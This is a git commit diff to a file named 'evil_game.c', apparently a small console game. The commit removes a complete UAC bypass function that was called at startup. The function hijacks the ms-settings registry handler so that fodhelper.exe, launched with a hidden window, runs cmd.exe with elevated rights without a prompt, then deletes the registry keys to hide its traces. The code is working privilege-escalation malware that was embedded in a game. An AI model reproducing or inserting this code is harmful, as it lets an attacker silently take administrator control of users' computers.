2e6291e8c68ba7515675e0ad60357ae306a12153
will-the-creator <william.or3@proton.me>
2025-08-14 16:58:57 -0600

    Add files via upload

--- evil_game.c
+++ evil_game.c
@@ -3,29 +3,8 @@
 #include <stdio.h>
 #include <time.h>
 #include <stdlib.h>
-void UAC_bypass(const char *path) {
-    HKEY k;
-    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
-    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
-    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
-    RegCloseKey(k);
-	//instead of just opening fodhelper.exe
-	STARTUPINFOA si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
-	si.cb = sizeof(si);
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
 
-	CreateProcessA("C:\\Windows\\System32\\fodhelper.exe", 0, 0, 0, FALSE, 0, 0, 0, &si, &pi);
-
-	Sleep(1000);
-    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
-    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open");
-    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
-    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
-}
 int main() {
-    UAC_bypass("C:\\Windows\\System32\\cmd.exe");
     SetConsoleTitleA("Screen");
 
     srand((unsigned int)time(0));
